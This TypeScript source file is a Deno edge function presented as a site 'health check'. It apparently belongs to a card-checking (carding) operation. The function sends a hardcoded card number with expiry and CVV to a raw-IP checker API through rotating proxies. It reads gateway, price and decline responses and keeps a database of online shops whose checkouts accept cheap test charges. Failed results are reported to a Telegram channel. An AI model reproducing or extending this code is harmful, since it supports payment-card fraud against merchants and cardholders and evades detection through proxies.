import { createClient } from "npm:@supabase/supabase-js@2";

const SUPABASE_URL = Deno.env.get("SUPABASE_URL")!;
const SUPABASE_SERVICE_ROLE_KEY = Deno.env.get("SUPABASE_SERVICE_ROLE_KEY")!;
const SUPABASE_ANON_KEY =
  Deno.env.get("SUPABASE_ANON_KEY") ?? Deno.env.get("SUPABASE_PUBLISHABLE_KEY") ?? "";
const TELEGRAM_BOT_TOKEN = Deno.env.get("TELEGRAM_BOT_TOKEN");
// Health check debug goes to dedicated debug channel (NOT admin DM)
const HEALTH_DEBUG_CHAT_ID = "-1003848532661";

const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Headers": "authorization, x-client-info, apikey, content-type, x-supabase-client-platform, x-supabase-client-platform-version, x-supabase-client-runtime, x-supabase-client-runtime-version",
  "Access-Control-Allow-Methods": "POST, OPTIONS",
};

const TEST_CC = "4266841674104656|03|27|908";
const API_BASE_URL = "http://108.165.12.183:8081/";

const getRandomItem = <T>(arr: T[]): T => arr[Math.floor(Math.random() * arr.length)];

const sendHealthCheckDebug = async (
  siteUrl: string,
  errorType: string,
  rawResponse: string,
  proxyStr: string,
  retryCount: number,
  httpStatus?: number,
) => {
  if (!TELEGRAM_BOT_TOKEN) return;
  try {
    const timestamp = new Date().toISOString().replace("T", " ").slice(0, 19);
    const truncatedRaw = rawResponse.length > 1500 ? rawResponse.substring(0, 1500) + "... [truncated]" : rawResponse;
    const proxyDisplay = proxyStr ? proxyStr.split(":").slice(0, 2).join(":") : "none";

    const msg = `🔧 <b>HEALTH CHECK DEBUG</b>

🌐 <b>Site:</b> <code>${siteUrl}</code>
⚠️ <b>Error:</b> ${errorType}
🔄 <b>Retries:</b> ${retryCount}/${MAX_RETRIES}
🛡 <b>Proxy:</b> <code>${proxyDisplay}</code>
${httpStatus !== undefined ? `📡 <b>HTTP Status:</b> ${httpStatus}\n` : ""}
━━━━ RAW API RESPONSE ━━━━
<pre>${truncatedRaw || "(empty)"}</pre>

🕐 ${timestamp}`;

    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: HEALTH_DEBUG_CHAT_ID,
        text: msg,
        parse_mode: "HTML",
      }),
    });
  } catch (e) {
    console.error("[HealthCheck] Failed to send debug:", e);
  }
};

const badResponses = [
  "Site not supported",
  "PAYMENTS_PAYMENT_FLEXIBILITY_TERMS_ID_MISMATCH",
  "DELIVERY_DELIVERY_LINE_DETAIL_CHANGED",
  "Payment method not available",
  "ARTIFACT_DISSATISFACTION",
  "VALIDATION_CUSTOM",
  '"Gateway":"Authorize.net"',
];

const PROXY_DEAD_INDICATORS = [
  "proxy error",
  "proxy authentication",
  "connection refused",
  "proxy connect",
  "tunneling socket",
  "proxy_error",
  "bad proxy",
  "cannot connect to host",
  "socks",
  "econnrefused",
  "econnreset",
];

const CURL_RETRY_INDICATORS = [
  "failed to perform",
  "getaddrinfo",
  "curl",
  "thread failed to start",
  "name or service not known",
  "could not resolve host",
];

const DECLINE_INDICATORS = [
  "card_declined",
  "declined",
  "insufficient",
  "do_not_honor",
  "3ds",
  "fraud",
  "restricted",
  "not_permitted",
  "generic_decline",
  "pickup_card",
  "lost_card",
  "stolen_card",
  "ds_required",
];

const MAX_RETRIES = 3;
const wait = (ms: number) => new Promise((resolve) => setTimeout(resolve, ms));
const getRetryDelay = (retryCount: number) => 2000 * (retryCount + 1) + Math.random() * 1000;

type HealthCheckResult = {
  url: string;
  status: "live" | "dead" | "error";
  price: number;
  priceStr: string;
  apiResponse?: string;
  error?: string;
  proxyDead?: boolean;
};

const checkSingleSite = async (
  siteUrl: string,
  proxyStr: string,
  proxyId: string | null,
  supabase: ReturnType<typeof createClient>,
  retryCount = 0,
): Promise<HealthCheckResult> => {
  const timeoutMs = 55000;
  const normalizedSiteUrl = siteUrl.trim().replace(/\/+$/, "");
  let timeoutId: ReturnType<typeof setTimeout> | undefined;

  try {
    const controller = new AbortController();
    timeoutId = setTimeout(() => controller.abort(), timeoutMs);

    const apiUrl = `${API_BASE_URL}?cc=${encodeURIComponent(TEST_CC)}&url=${encodeURIComponent(normalizedSiteUrl)}&proxy=${encodeURIComponent(proxyStr)}`;

    console.log(`[Check] ${normalizedSiteUrl} | proxy=${proxyStr ? "yes" : "none"}`);

    const response = await fetch(apiUrl, {
      method: "GET",
      signal: controller.signal,
      headers: {
        Accept: "application/json, text/plain, */*",
        "Cache-Control": "no-cache",
      },
    });

    const rawText = await response.text();

    if (!rawText || rawText.trim() === "") {
      if (retryCount < MAX_RETRIES) {
        console.log(`[Retry] ${normalizedSiteUrl} → empty response, retry ${retryCount + 1}/${MAX_RETRIES}`);
        await wait(getRetryDelay(retryCount));
        return checkSingleSite(normalizedSiteUrl, proxyStr, proxyId, supabase, retryCount + 1);
      }

      console.log(`[Result] ${normalizedSiteUrl} → ERROR (empty response after ${MAX_RETRIES} retries)`);
      await sendHealthCheckDebug(normalizedSiteUrl, "Empty response after retries", "", proxyStr, retryCount, response.status);
      return { url: normalizedSiteUrl, status: "error", price: 0, priceStr: "$0.00", error: "Empty response" };
    }

    const rawLower = rawText.toLowerCase();

    const isCurlError = CURL_RETRY_INDICATORS.some((indicator) => rawLower.includes(indicator));
    if (isCurlError) {
      if (retryCount < MAX_RETRIES) {
        console.log(`[Retry] ${normalizedSiteUrl} → curl/DNS error, retry ${retryCount + 1}/${MAX_RETRIES}`);
        await wait(getRetryDelay(retryCount));
        return checkSingleSite(normalizedSiteUrl, proxyStr, proxyId, supabase, retryCount + 1);
      }

      console.log(`[Result] ${normalizedSiteUrl} → ERROR (curl/DNS failed after ${MAX_RETRIES} retries)`);
      await sendHealthCheckDebug(normalizedSiteUrl, "curl/DNS failed after retries", rawText.substring(0, 500), proxyStr, retryCount);
      return {
        url: normalizedSiteUrl,
        status: "error",
        price: 0,
        priceStr: "$0.00",
        apiResponse: rawText.substring(0, 500),
        error: "DNS resolution failed",
      };
    }

    const isProxyDead = PROXY_DEAD_INDICATORS.some((indicator) => rawLower.includes(indicator));
    if (isProxyDead) {
      if (proxyId) {
        console.log(`[Result] Proxy dead for ${normalizedSiteUrl}, removing proxy ${proxyId}`);
        await supabase.from("proxies").delete().eq("id", proxyId);
      }

      return {
        url: normalizedSiteUrl,
        status: "error",
        price: 0,
        priceStr: "$0.00",
        apiResponse: rawText.substring(0, 500),
        error: "Dead proxy",
        proxyDead: true,
      };
    }

    const isBad = badResponses.some((bad) => rawLower.includes(bad.toLowerCase()));
    if (isBad) {
      await supabase.from("gateway_urls").delete().eq("url", normalizedSiteUrl);
      console.log(`[Result] ${normalizedSiteUrl} → DEAD (bad response)`);
      return {
        url: normalizedSiteUrl,
        status: "dead",
        price: 0,
        priceStr: "$0.00",
        apiResponse: rawText.substring(0, 500),
        error: "Bad response",
      };
    }

    try {
      const json = JSON.parse(rawText);
      const gateway = json.Gateway || json.Gate || "";
      const priceRaw = json.Price;
      const price =
        typeof priceRaw === "number"
          ? priceRaw
          : typeof priceRaw === "string"
            ? Number.parseFloat(priceRaw) || 0
            : 0;
      const priceStr = price > 0 ? `$${price.toFixed(2)}` : "$0.00";
      const apiResponse = json.Response ? String(json.Response).replace(/<[^>]*>/g, "").substring(0, 500) : "";
      const apiStatus = json.Status;
      const responseLower = apiResponse.toLowerCase();
      const isDeclineResponse = DECLINE_INDICATORS.some((indicator) => responseLower.includes(indicator));

      if (responseLower.includes("site dead")) {
        await supabase.from("gateway_urls").delete().eq("url", normalizedSiteUrl);
        console.log(`[Result] ${normalizedSiteUrl} → DEAD (site dead response)`);
        return { url: normalizedSiteUrl, status: "dead", price: 0, priceStr: "$0.00", apiResponse, error: "Site dead" };
      }

      if (responseLower.includes("proxy dead")) {
        await supabase.from("gateway_urls").delete().eq("url", normalizedSiteUrl);
        console.log(`[Result] ${normalizedSiteUrl} → DEAD (proxy dead response)`);
        return { url: normalizedSiteUrl, status: "dead", price: 0, priceStr: "$0.00", apiResponse, error: "Proxy dead" };
      }

      if (gateway === "Authorize.net") {
        await supabase.from("gateway_urls").delete().eq("url", normalizedSiteUrl);
        console.log(`[Result] ${normalizedSiteUrl} → DEAD (Authorize.net)`);
        return { url: normalizedSiteUrl, status: "dead", price: 0, priceStr: "$0.00", apiResponse, error: "Authorize.net gateway" };
      }

      if (isDeclineResponse && gateway && gateway !== "UNKNOWN") {
        if (price > 0 && price <= 100) {
          await supabase.from("gateway_urls").upsert({ url: normalizedSiteUrl, price }, { onConflict: "url" });
        }
        console.log(`[Result] ${normalizedSiteUrl} → LIVE (declined, ${priceStr}, gateway: ${gateway})`);
        return { url: normalizedSiteUrl, status: "live", price, priceStr, apiResponse };
      }

      if (isDeclineResponse && (gateway === "UNKNOWN" || !gateway)) {
        console.log(`[Result] ${normalizedSiteUrl} → LIVE (declined, UNKNOWN gateway, site active)`);
        return { url: normalizedSiteUrl, status: "live", price: 0, priceStr: "$0.00", apiResponse };
      }

      if ((gateway === "UNKNOWN" || !gateway) && price === 0) {
        await supabase.from("gateway_urls").delete().eq("url", normalizedSiteUrl);
        console.log(`[Result] ${normalizedSiteUrl} → DEAD (UNKNOWN gateway, no price)`);
        return { url: normalizedSiteUrl, status: "dead", price: 0, priceStr: "$0.00", apiResponse, error: "Unknown gateway" };
      }

      if (price > 100) {
        await supabase.from("gateway_urls").delete().eq("url", normalizedSiteUrl);
        console.log(`[Result] ${normalizedSiteUrl} → DEAD (price too high: ${priceStr})`);
        return { url: normalizedSiteUrl, status: "dead", price: 0, priceStr: "$0.00", apiResponse, error: "Price exceeds $100" };
      }

      if (apiStatus === true || (apiStatus === undefined && gateway && gateway !== "UNKNOWN" && price > 0 && price <= 100)) {
        await supabase.from("gateway_urls").upsert({ url: normalizedSiteUrl, price }, { onConflict: "url" });
        console.log(`[Result] ${normalizedSiteUrl} → LIVE (charged/active, ${priceStr}, gateway: ${gateway})`);
        return { url: normalizedSiteUrl, status: "live", price, priceStr, apiResponse };
      }

      if (apiStatus === false) {
        if (responseLower.includes("merchandise_expected_price_mismatch")) {
          await supabase.from("gateway_urls").delete().eq("url", normalizedSiteUrl);
          console.log(`[Result] ${normalizedSiteUrl} → DEAD (price mismatch)`);
          return { url: normalizedSiteUrl, status: "dead", price: 0, priceStr: "$0.00", apiResponse, error: "Price mismatch" };
        }

        if (gateway && gateway !== "UNKNOWN" && price > 0) {
          await supabase.from("gateway_urls").upsert({ url: normalizedSiteUrl, price }, { onConflict: "url" });
          console.log(`[Result] ${normalizedSiteUrl} → LIVE (declined but active, ${priceStr}, gateway: ${gateway})`);
          return { url: normalizedSiteUrl, status: "live", price, priceStr, apiResponse };
        }

        if (gateway && gateway !== "UNKNOWN") {
          if (isDeclineResponse) {
            console.log(`[Result] ${normalizedSiteUrl} → LIVE (declined, gateway: ${gateway}, no price update)`);
            return { url: normalizedSiteUrl, status: "live", price: 0, priceStr: "$0.00", apiResponse };
          }

          console.log(`[Result] ${normalizedSiteUrl} → ERROR (gateway: ${gateway}, response: ${apiResponse.substring(0, 100)})`);
          return { url: normalizedSiteUrl, status: "error", price: 0, priceStr: "$0.00", apiResponse, error: "Gateway error" };
        }

        await supabase.from("gateway_urls").delete().eq("url", normalizedSiteUrl);
        console.log(`[Result] ${normalizedSiteUrl} → DEAD (no gateway, no price)`);
        return { url: normalizedSiteUrl, status: "dead", price: 0, priceStr: "$0.00", apiResponse };
      }

      if (price > 0 && price <= 100) {
        await supabase.from("gateway_urls").upsert({ url: normalizedSiteUrl, price }, { onConflict: "url" });
        console.log(`[Result] ${normalizedSiteUrl} → LIVE (price detected: ${priceStr})`);
        return { url: normalizedSiteUrl, status: "live", price, priceStr, apiResponse };
      }

      console.log(`[Result] ${normalizedSiteUrl} → DEAD (unrecognized: ${rawText.substring(0, 200)})`);
      return { url: normalizedSiteUrl, status: "dead", price: 0, priceStr: "$0.00", apiResponse };
    } catch {
      const apiResponse = rawText.replace(/<[^>]*>/g, "").substring(0, 500);
      const responseLower = apiResponse.toLowerCase();
      const fallbackPriceMatch = rawText.match(/"Price"\s*:\s*"?(\d+(?:\.\d{1,2})?)"?/i);
      const fallbackPrice = fallbackPriceMatch ? Number.parseFloat(fallbackPriceMatch[1]) || 0 : 0;
      const fallbackPriceStr = fallbackPrice > 0 ? `$${fallbackPrice.toFixed(2)}` : "$0.00";
      const isDeclineResponse = DECLINE_INDICATORS.some((indicator) => responseLower.includes(indicator));

      if (responseLower.includes("site dead")) {
        await supabase.from("gateway_urls").delete().eq("url", normalizedSiteUrl);
        console.log(`[Result] ${normalizedSiteUrl} → DEAD (text site dead response)`);
        return { url: normalizedSiteUrl, status: "dead", price: 0, priceStr: "$0.00", apiResponse, error: "Site dead" };
      }

      if (responseLower.includes("proxy dead")) {
        await supabase.from("gateway_urls").delete().eq("url", normalizedSiteUrl);
        console.log(`[Result] ${normalizedSiteUrl} → DEAD (text proxy dead response)`);
        return { url: normalizedSiteUrl, status: "dead", price: 0, priceStr: "$0.00", apiResponse, error: "Proxy dead" };
      }

      if (isDeclineResponse) {
        if (fallbackPrice > 0 && fallbackPrice <= 100) {
          await supabase.from("gateway_urls").upsert({ url: normalizedSiteUrl, price: fallbackPrice }, { onConflict: "url" });
        }
        console.log(`[Result] ${normalizedSiteUrl} → LIVE (text decline response, ${fallbackPriceStr})`);
        return {
          url: normalizedSiteUrl,
          status: "live",
          price: fallbackPrice,
          priceStr: fallbackPriceStr,
          apiResponse,
        };
      }

      console.log(`[Result] ${normalizedSiteUrl} → ERROR (non-JSON response: ${rawText.substring(0, 200)})`);
      await sendHealthCheckDebug(normalizedSiteUrl, "Non-JSON response", rawText.substring(0, 500), proxyStr, retryCount);
      return {
        url: normalizedSiteUrl,
        status: "error",
        price: fallbackPrice,
        priceStr: fallbackPriceStr,
        apiResponse,
        error: "Non-JSON response",
      };
    }
  } catch (err) {
    const msg = err instanceof Error ? err.message : "Unknown error";
    const msgLower = msg.toLowerCase();

    if ((msgLower.includes("abort") || msgLower.includes("timeout") || msgLower.includes("fetch failed")) && retryCount < MAX_RETRIES) {
      console.log(`[Retry] ${normalizedSiteUrl} → transient fetch error, retry ${retryCount + 1}/${MAX_RETRIES}`);
      await wait(getRetryDelay(retryCount));
      return checkSingleSite(normalizedSiteUrl, proxyStr, proxyId, supabase, retryCount + 1);
    }

    console.log(`[Error] ${normalizedSiteUrl}: ${msg}`);
    await sendHealthCheckDebug(normalizedSiteUrl, `Fetch error: ${msg}`, "", proxyStr, retryCount);
    return {
      url: normalizedSiteUrl,
      status: "error",
      price: 0,
      priceStr: "$0.00",
      error: msgLower.includes("abort") ? "Timeout" : msg,
    };
  } finally {
    if (timeoutId) clearTimeout(timeoutId);
  }
};

Deno.serve(async (req) => {
  if (req.method === "OPTIONS") {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    const authHeader = req.headers.get("Authorization");
    if (!authHeader?.startsWith("Bearer ")) {
      return new Response(JSON.stringify({ error: "Unauthorized" }), { status: 401, headers: { ...corsHeaders, "Content-Type": "application/json" } });
    }

    const supabase = createClient(SUPABASE_URL, SUPABASE_SERVICE_ROLE_KEY);
    const anonClient = createClient(SUPABASE_URL, SUPABASE_ANON_KEY, {
      global: { headers: { Authorization: authHeader } },
    });

    const token = authHeader.replace("Bearer ", "");
    const { data: claimsData, error: authError } = await anonClient.auth.getClaims(token);
    const userId = claimsData?.claims?.sub as string | undefined;

    if (authError || !userId) {
      return new Response(JSON.stringify({ error: "Unauthorized" }), { status: 401, headers: { ...corsHeaders, "Content-Type": "application/json" } });
    }

    const { data: roleData } = await supabase
      .from("user_roles")
      .select("role")
      .eq("user_id", userId)
      .eq("role", "admin")
      .maybeSingle();

    if (!roleData) {
      return new Response(JSON.stringify({ error: "Admin access required" }), { status: 403, headers: { ...corsHeaders, "Content-Type": "application/json" } });
    }

    const body = await req.json();
    const url = typeof body?.url === "string" ? body.url.trim().replace(/\/+$/, "") : "";
    const proxyOverride = typeof body?.proxy === "string" ? body.proxy.trim() : undefined;
    const proxyIdOverride = typeof body?.proxyId === "string" ? body.proxyId : undefined;

    if (!url) {
      return new Response(JSON.stringify({ error: "No URL provided" }), { status: 400, headers: { ...corsHeaders, "Content-Type": "application/json" } });
    }

    let proxyStr = "";
    let proxyId: string | null = null;

    if (proxyOverride) {
      proxyStr = proxyOverride;
      if (proxyIdOverride) {
        proxyId = proxyIdOverride;
      }
    } else {
      const { data: liveProxies } = await supabase
        .from("proxies")
        .select("*")
        .eq("status", "live");

      if (liveProxies && liveProxies.length > 0) {
        const randomProxy = getRandomItem(liveProxies);
        proxyId = randomProxy.id;
        proxyStr = randomProxy.username && randomProxy.password
          ? `${randomProxy.ip}:${randomProxy.port}:${randomProxy.username}:${randomProxy.password}`
          : `${randomProxy.ip}:${randomProxy.port}`;
      }
    }

    const result = await checkSingleSite(url, proxyStr, proxyId, supabase);

    return new Response(JSON.stringify(result), {
      headers: { ...corsHeaders, "Content-Type": "application/json" },
    });
  } catch (error) {
    console.error("Health check error:", error);
    return new Response(
      JSON.stringify({ error: error instanceof Error ? error.message : "Internal error" }),
      { status: 500, headers: { ...corsHeaders, "Content-Type": "application/json" } },
    );
  }
});